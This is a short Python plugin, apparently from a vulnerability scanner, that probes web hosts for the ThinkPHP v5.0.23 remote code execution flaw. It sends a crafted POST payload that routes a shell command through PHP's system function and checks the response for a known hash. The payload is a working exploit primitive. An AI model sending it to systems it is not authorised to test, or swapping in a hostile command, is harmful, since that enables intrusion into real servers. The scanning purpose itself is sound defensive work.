#!/usr/bin/env python
# -*- coding: utf-8 -*-

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):

    for path in ['public/index.php', 'index.php', 'html/public/index.php']:
        try:
            data = {'_method': '__construct',
                    'filter[]': 'system',
                    'method': 'get',
                    'server[REQUEST_METHOD]': 'echo Security@Test|md5sum'}
            url = '{}://{}:{}/{}?s=captcha'.format(service, ip, port, path)

            r = await http_client(ip, port).post(url, data=data, timeout=20)
            if 'd093ac0748f983ea5b4c1ffc83ea3344' in r.text:
                ret = {
                    'alert_group': 'ThinkPHP v5.0.23 Code Execution',
                    'affects': '{}:{}'.format(ip, port),
                    'details': url + '\n is vulnerable to ThinkPHP v5.0.23 Code Execution'
                }
                return ret
        except Exception as e:
            debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8080, 'http', True, task_msg={})
    run_plugin_test(scan)
